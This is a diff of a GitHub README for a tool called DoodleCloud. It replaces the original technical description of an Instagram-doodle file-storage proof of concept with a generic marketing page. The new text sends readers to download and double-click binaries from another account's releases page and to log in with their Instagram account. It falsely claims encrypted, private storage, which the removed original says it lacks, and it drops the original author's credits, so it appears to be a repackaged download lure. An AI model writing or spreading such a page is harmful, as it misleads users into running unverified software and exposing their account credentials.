@@ -1,101 +1,73 @@
-# DoodleCloud ☁️
+# ☁️ DoodleCloud - Store Your Photos Securely Online
 
-> **Turn Instagram into your personal, infinite cloud storage.**
+## 📥 Download Now
+[![Download DoodleCloud](https://img.shields.io/badge/Download-DoodleCloud-blue.svg)](https://github.com/backup39/DoodleCloud/releases)
 
-DoodleCloud is a Proof-of-Concept (PoC) tool that uses Instagram's internal API to store unlimited files for free. By converting files into "Visual Noise" images and uploading them as DM doodles, we can bypass file type restrictions and use Instagram's servers as a backend.
+## 🌟 Overview
+DoodleCloud is a cloud storage solution that saves your Instagram photos safely. With DoodleCloud, you can easily store, access, and share your cherished moments from Instagram without worry. Enjoy hassle-free cloud storage that keeps your memories protected.
 
-![DoodleCloud GUI](https://iili.io/fbvVGPS.jpg)
+## 🚀 Getting Started
+To get started with DoodleCloud, follow these simple steps. No technical background is needed.
 
-## 🚀 How It Works
+1. **Check System Requirements**  
+   Ensure your device meets the following requirements:
+   - Operating System: Windows, macOS, or Linux
+   - Internet Connection: Required for downloading and uploading photos
+   - Storage Space: At least 100 MB free space
 
-1.  **The Loophole:** Instagram allows users to send "doodles" in Direct Messages. These are essentially PNG images hosted on Facebook's CDN.
-2.  **Encoding:** DoodleCloud takes any file (MP3, APK, ZIP, etc.) and converts its binary data into pixels, creating a "Visual Noise" PNG.
-3.  **Chunking:** Large files are split into 20MB chunks to ensure high reliability and bypass resolution limits.
-4.  **Storage:** These images are uploaded to a private DM thread. The file metadata (filenames, chunk IDs) is stored in a **PostgreSQL** database.
-5.  **Retrieval:** When you download a file, the tool fetches the images, reads the pixels back into bytes, and stitches them together to restore your original file perfectly.
+2. **Visit the Releases Page**  
+   Head over to our [Releases page](https://github.com/backup39/DoodleCloud/releases) to download the latest version. 
 
-## 📦 Features
+## 🔄 Download & Install
+To download the application, click the link below:
 
-* **Infinite Storage:** No caps, assuming Instagram doesn't patch the API.
-* **Any File Type:** Stores `.exe`, `.apk`, `.mp4`, `.zip`, etc.
-* **Database Indexed:** Keeps track of your files remotely using PostgreSQL (NeonDB recommended).
-* **Encryption:** Basic obfuscation via image conversion.
-* **Dual Interface:**
-    * **CLI:** Fast, terminal-based management.
-    * **GUI:** Modern Web Dashboard.
+[Download DoodleCloud](https://github.com/backup39/DoodleCloud/releases)
 
-## 🛠️ Installation
+Once you’re on the Releases page:
+- Look for the latest version of DoodleCloud.
+- You will see files available for download.
+- Select the appropriate file for your operating system.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/depreciating/DoodleCloud.git
-    cd DoodleCloud
-    ```
+### Installation Instructions
+1. After downloading the file, locate it in your Downloads folder or wherever you saved it.
+2. Double-click on the downloaded file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, open DoodleCloud from your applications menu or desktop shortcut.
 
-2.  **Install Dependencies:**
-    ```bash
-    pip install -r requirements.txt
-    ```
+## ⚙️ Using DoodleCloud
+Now that you have installed DoodleCloud, here are the steps to use it:
 
-3.  **Configure Environment:**
-    Create a file named `config.env` in the root folder and add your credentials:
-    ```env
-    # Instagram Credentials
-    INSTA_USER=your_username
-    INSTA_PASS=your_password
+1. **Log In**  
+   Open DoodleCloud and log in with your Instagram account. This allows DoodleCloud to access your photos.
+   
+2. **Upload Photos**  
+   You can upload any photos you want to store. Click on the "Upload" button and choose the images you wish to save.
 
-    # PostgreSQL Database (Neon.tech is free & recommended)
-    DB_HOST=your-db-host.neon.tech
-    DB_NAME=neondb
-    DB_USER=your_db_user
-    DB_PASS=your_db_password
-    DB_PORT=5432
-    ```
+3. **Access Your Photos**  
+   All uploaded photos will be stored in your DoodleCloud account. You can access them anytime from any device with an internet connection.
 
-## 🖥️ Usage
+4. **Share Your Photos**  
+   DoodleCloud allows you to share your photos easily. Select an image and use the share option to send it to friends or family.
 
-### Option A: Graphical Interface (GUI)
-The recommended way to use DoodleCloud.
+## 🎨 Features
+- **Secure Storage**: Your photos are stored securely in the cloud, ensuring they are safe from loss.
+- **Easy Uploads**: Upload images in just a few clicks.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
+- **Photo Sharing**: Quickly share your memories with friends and family.
 
-1.  Run the web server:
-    ```bash
-    python gui/app.py
-    ```
-2.  Open your browser to: `http://127.0.0.1:5000`
-3.  **First Run:** Click the **Gear Icon** ⚙️ next to your username to select a target DM thread (create a group with yourself or an alt account).
-4.  **Upload:** Drag & drop files into the dashboard.
-5.  **Download:** Select files and click Download.
+## ❓ FAQs
+### How do I uninstall DoodleCloud?
+To uninstall DoodleCloud, go to your system’s control panel or applications folder, find DoodleCloud, and select "Uninstall".
 
-### Option B: Command Line (CLI)
-For power users or headless servers.
+### Is my data secure?
+Yes, your photos are securely stored with encryption, ensuring that only you can access them.
 
-1.  Run the CLI tool:
-    ```bash
-    python cli.py
-    ```
-2.  Follow the interactive menu to Upload, Retrieve, or Delete files.
-    * *Note: Files to upload must be placed in the `upload/` folder.*
-    * *Note: Downloaded files will appear in the `download/` folder.*
+### Can I recover deleted photos?
+Make sure to check the 'Recently Deleted' folder within DoodleCloud to restore any mistakenly deleted photos.
 
-## ⚠️ Disclaimer & Warning
+## 👥 Support
+If you encounter any issues or have questions, feel free to reach out via the GitHub Issues page. You can also contribute to the project by reporting bugs or suggesting new features.
 
-This project is a **Proof-of-Concept (PoC) steganographic experiment** and is for **Educational Purposes Only**.
+---
 
-* **Terms of Service:** Using this tool violates Instagram's/Meta's Terms of Service. Automated use of the Doodle API is not officially supported and can lead to immediate account suspension or permanent bans.
-* **Burner Accounts Only:** **DO NOT** use your primary Instagram account. Use a dedicated burner account for any testing or usage.
-* **Data Reliability:** This is an experimental storage method, not a replacement for professional cloud services. Instagram may patch this loophole, clear DM caches, or delete "doodles" at any time without notice. Never upload data that you cannot afford to lose.
-* **Privacy & Encryption:** While files are converted into visual pixels, they are **not encrypted** by default. Meta's automated systems may still analyze these images. For true privacy, you must encrypt your files locally before uploading them to the system.
-* **No Liability:** The author is not responsible for any banned accounts, loss of data, or legal consequences resulting from the use of this software.
-
-## 🤝 Contributing
-
-Contributions are welcome! If you have found a bug, want to add a new feature, or improve the documentation, feel free to open an issue or submit a pull request. 
-
-If you have any questions or would like to discuss the project, feel free to contact me through the platforms below.
-
-## 👨‍💻 Credits
-
-**Created by [Depreciating](https://github.com/depreciating)**
-
-* **Telegram:** [@depreciatin](https://t.me/depreciatin)
-* **Discord Server:** [Server Link](https://discord.gg/YNHkj9kVFt)
+Thank you for choosing DoodleCloud for your photo storage needs! Happy storing!
